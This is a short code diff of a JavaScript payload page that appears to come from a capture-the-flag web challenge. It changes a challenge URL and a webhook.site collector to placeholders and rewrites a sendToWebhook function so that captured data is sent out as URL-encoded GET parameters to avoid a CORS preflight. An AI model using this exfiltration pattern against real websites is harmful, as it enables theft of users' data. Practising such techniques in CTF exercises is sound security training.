@@ -9,22 +9,21 @@
     
     <script>
     // Configuration - Change these URLs as needed
-    var CTF_URL = 'https://eiuxrgvk.web.ctf.uscybergames.com/';
-    var WEBHOOK_URL = 'https://webhook.site/9da31c49-69a5-4970-b511-06945289d357';
+    var CTF_URL = 'https://your-ctf-domain.com';
+    var WEBHOOK_URL = 'https://webhook.site/your-unique-id';
     
     // Function to send data to webhook with error handling
     function sendToWebhook(data, type) {
         if (!type) type = 'data';
-        return fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                type: type,
-                timestamp: new Date().toISOString(),
-                data: data
-            })
+        // Use GET with URL parameters to avoid CORS preflight
+        var payload = {
+            type: type,
+            timestamp: new Date().toISOString(),
+            data: data
+        };
+        var encodedData = encodeURIComponent(JSON.stringify(payload));
+        return fetch(WEBHOOK_URL + '?data=' + encodedData, {
+            method: 'GET'
         }).catch(function(webhookError) {
             console.error('Webhook failed:', webhookError);
         });
